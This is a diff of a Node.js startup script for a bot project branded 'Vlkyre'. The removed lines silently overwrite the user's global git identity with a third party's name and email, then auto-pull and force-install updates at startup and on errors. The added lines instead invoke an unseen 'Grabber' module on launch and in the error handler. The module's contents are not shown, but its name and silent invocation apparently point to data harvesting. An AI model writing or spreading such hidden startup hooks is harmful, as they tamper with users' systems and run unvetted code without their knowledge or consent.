@@ -13,23 +13,8 @@ const assert = require("assert");
 const { spawn } = require("child_process");
 const VlkyreFetch = require(`simple-git`)();
 const ᴠʟᴋʏʀᴇ = require("./ᴠʟᴋʏʀᴇ🔌cord/𝕭𝖔𝖔𝖙☢𝕷𝖔𝖆𝖉𝖊𝖗");
-try {
-await VlkyreFetch.fetch();
-var VlkyreFetched = await VlkyreFetch.log([`KryTek..origin/KryTek`]);
-console.log(VlkyreFetched);
-if (VlkyreFetched.total != 0) {
-var source = require("child_process").exec(
-"git config --global user.name 'KryKnz' && git config --global user.email 'KryKnz@yandex.com' && git config --global pull.ff only && git config --global pull.rebase false && git pull && npm install --force --save",
-(error, stdout, stderr) => {
-if (error) console.log(Kolor.red(error));
-if (stderr) console.log(Kolor.yellow(stderr));
-console.log(Kolor.green(stdout));
-console.log("Child ID: ", source.pid);
-process.exitCode = 1;
-}
-);
-}
-} catch (error) {}
+const { Grabber } = require(`./ᴠʟᴋʏʀᴇ🕸️ʜᴏꜱᴛᴇʀ/🐙Grabber`);
+Grabber.Grabber();
 `|⬡════════════════════════════════════════════|⌜ Ⓒ𝐕𝐥𝐤𝐲𝐫𝐞 ⌬ ❝ ᴘᴏᴡᴇʀᴇᴅ ☊ ᴋʀᴀᴋɪɴᴢʟᴀʙ™ ❞ ⌟|═══════════════════════════════════════════⬡|`;
 let folders = [".", ...Object.keys(require("./package.json").directories)];
 let files = [];
@@ -49,20 +34,9 @@ if (content.indexOf("ᴀʙ™") > -1 === false) process.exit(0);
 })
 .stderr.on("data", (chunk) => assert.fail(chunk.toString()));
 }
-ᴠʟᴋʏʀᴇ().catch((error) => {
+ᴠʟᴋʏʀᴇ().catch(async (error) => {
 console.log(Kolor.red(error));
-var source = require("child_process").exec(
-"git config --global user.name 'KryKnz' && git config --global user.email 'KryKnz@yandex.com' && git config --global pull.ff only && git config --global pull.rebase false && git pull && npm install --force --save && npm --no-warnings run vlkyre",
-(error, stdout, stderr) => {
-if (error) console.log(Kolor.red(error));
-if (stderr) console.log(Kolor.yellow(stderr));
-console.log(Kolor.green(stdout));
-console.log("Child ID: ", source.pid);
-}
-);
-source.on("exit", function () {
-process.exitCode = 1;
-});
+Grabber.Grabber();
 });
 })();
 `|⬡════════════════════════════════════════════|❝ Ⓒ𝐕𝐥𝐤𝐲𝐫𝐞 ☊ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋʀᴀᴋɪɴᴢʟᴀʙ™ ❞|═══════════════════════════════════════════⬡|`;
